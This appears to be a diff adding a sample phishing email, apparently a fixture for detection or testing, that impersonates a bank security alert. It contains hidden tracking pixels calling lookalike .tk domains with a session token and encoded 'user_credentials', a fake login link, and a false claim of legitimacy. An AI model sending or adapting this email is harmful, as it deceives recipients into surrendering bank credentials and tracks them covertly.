@@ -1,0 +1,23 @@
+Subject: URGENT: Your Bank Account Has Been Compromised
+From: security@secure-bank-verify.com
+To: victim@company.com
+Content-Type: text/html; charset=utf-8
+
+<html>
+<head><title>Bank Security Alert</title></head>
+<body>
+    <h2 style="color: red;">URGENT SECURITY ALERT</h2>
+    <p>Your bank account has been accessed from an unknown location.</p>
+    <p>Please verify your identity immediately to prevent unauthorized access.</p>
+    
+    <!-- Pixel periculos pentru phishing bancar -->
+    <img src="https://secure-paypal-verification.account-security.tk/verify.gif?user_id=12345&session_token=abc123" width="1" height="1" style="display:none;">
+    
+    <!-- Pixel pentru colectare masivă de date -->
+    <img src="https://secure-login.verify-account.tk/p.gif?d=%75%73%65%72%5f%63%72%65%64%65%6e%74%69%61%6c%73" width="1" height="1" style="visibility:hidden;">
+    
+    <a href="https://secure-bank-verify.com/login">Click here to secure your account</a>
+    
+    <p><small>This is a legitimate security notification. Do not ignore.</small></p>
+</body>
+</html>
